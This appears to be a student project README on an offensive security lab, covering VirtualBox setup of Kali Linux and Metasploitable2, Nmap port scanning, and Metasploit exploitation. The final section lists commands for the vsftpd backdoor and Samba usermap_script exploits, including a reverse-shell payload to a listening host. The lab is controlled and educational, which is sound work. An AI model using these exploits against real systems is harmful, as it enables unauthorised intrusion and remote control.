# Offensive Security Tools and Research

---

### Group Members
- Ryan Eisenbeis, Grayson Oldham, Owen Richard, Nycahri Griffin

### Project Description

- The purpose of this project is to conduct offensive security research focused on identifying 
vulnerabilities within IT systems and improving cybersecurity defenses. The project will simulate real-world attacks
using a controlled environment that includes a Kali Linux VM and a Metasploitable2 VM, providing a platform for
vulnerability discovery and exploitation. The primary tools used in this research will be Metasploit Framework and Nmap,
focusing on how they can be utilized to find and exploit vulnerabilities.

### Tools Used

- `Oracle VirtualBox VM` a virtualization software used for creating VMs
- `Metasploitable2 VM` a VM intentionally configured to have exploitable vulnerabilities, also the target VM for this project
- `Kali Linux VM` a VM configured with pre-installed offensive security tools, also the attacking VM in this project
- `Nmap` a network mapping Linux tool used to scan IP addresses and ports on a network
- `Metasploit Framework` a penetration testing Linux tool used for identifying and exploiting vulnerabilities on a system
 
---

# Phase 1 Objectives

- Set up the `Kali Linux VM` as the attack system and the `Metasploitable2 VM` as the target.
- Use `Nmap` for port scanning and discovering vulnerabilities on the target system, followed by using the `Metasploit
Framework` to exploit the vulnerabilities.
- Document the technical steps taken and our findings.


# Phase 1.1 - Setting up the Metasploitable 2 VM

- Download `Oracle Virtual Box VM` software from https://www.virtualbox.org
- Download the `Metasploitable2` iso image from http://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download
- Extract the files from the downloaded zip file
- Create a new VM instance in VirtualBox with the following hardware requirements:
  + **2 GB Memory**
  + **1 CPU**
  + **Create a Virtual Hard Disk (or Use an Existing Hard Disk File)**
- Install the `Metasploitable2` iso image onto the newly created VM instance
- Change the **Network Adapter** to **Host-only Adapter** in the `Metasploitable2 VM` machine settings
- Start the `Metasploitable2 VM` 


# Phase 1.2 - Setting up the Kali Linux VM
- Download the `Kali Linux` iso image from https://www.kali.org/get-kali/#kali-installer-images
- Create a new VM instance in VirtualBox with the following hardware requirements:
  + **8 GB Memory**
  + **4 CPUs**
  + **Create a Virtual Hard Disk with 80 GB of storage**
- Install the `Kali Linux` iso image onto the newly created VM instance
- Start the `Kali Linux VM`
- Select "Graphical Install" on the boot up menu
- Choose basic machine preferences
- Provide login credentials
- Choose clock settings
- Partition the Virtual Hard Disk with the following options:
  + **All files in one partition**
  + **Use entire disk**
  + **Select the /dev/sda ATA VBOX HARDDISK partition**
  + **Select "Yes" to write changes to the disk**
  + **Finish partitioning and write changes to disk**
- Select software preferences
- Install the GRUB bootloader on the /dev/sda partition
- Reboot the `Kali Linux VM` and sign in using the login credentials created

# Phase 1.3 - Port Scanning using Nmap

- The first step is to boot up the `Kali Linux VM` and the `Metasploitable2 VM`
- Once both VMs are started, we need to obtain the IP address of the target system
- To do this, run the following command in the `Metasploitable2 VM` terminal

**Displays IP configuration information on the system**
``` 
ifconfig
```

- Next, we will run an `Nmap` port scan to find all the open ports on the `Metasploitable2 VM` using the following command

**Scans all 65,535 ports on the target system and returns every open port**
```
nmap -p- <target ip>
```

- A few exploitable ports that were open on our target system are as follows
  + `ftp port 21`
  + `telnet port 23`
  + `samba port 445`

# Phase 1.4 - Exploiting using Metasploit Framework

- Now that we know the open ports on the target system, we can use the `Metasploit Framework` tool on our `Kali Linux VM` to exploit some vulnerabilities
- Since we know that `ftp port 21` is open, we can exploit an FTP shell access vulnerability on the target system using the following commands

**Loads the exploit to target an FTP backdoor vulnerability granting unauthorized access**
```
use exploit/unix/ftp/vsftpd_234_backdoor
```
**Sets the remote host to the IPv4 address of the target system**
```
set RHOST <target ip>
```
**Runs the exploit**
```
exploit
```

- Next, we can run the following command to gain remote access to the target system via the open `telnet port 23`

**Connects to a remote system using the telnet protocol using the format `service target_ip port_number`**

```
telnet <target ip> 23
```

- We can also access the shell of the target system via the `samba port 445` by using the following commands

**Loads the exploit to target a samba vulnerability**
```
use exploit/multi/samba/usermap_script
```
**Sets remote host IPv4 address of target system**
```
set RHOST <target ip>
```
**Sets payload to open a reverse shell**
```
set payload cmd/unix/reverse
```
**Sets the IPv4 address of host machine where the reverse shell will connect**
```
set LHOST <host ip>
```
**Sets the port on the host machine that will listen for the reverse shell**
```
set LPORT 4444
```
**Runs the exploit**
```
exploit
```